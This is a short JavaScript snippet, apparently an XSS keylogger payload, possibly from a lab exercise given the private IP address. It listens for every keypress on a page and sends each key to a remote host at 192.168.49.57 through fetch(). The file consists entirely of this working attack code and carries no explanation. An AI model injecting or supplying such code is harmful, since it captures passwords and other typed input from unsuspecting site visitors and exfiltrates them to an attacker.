function logKey(event){
        fetch("http://192.168.49.57/k?key=" + event.key)
}

document.addEventListener('keydown', logKey);
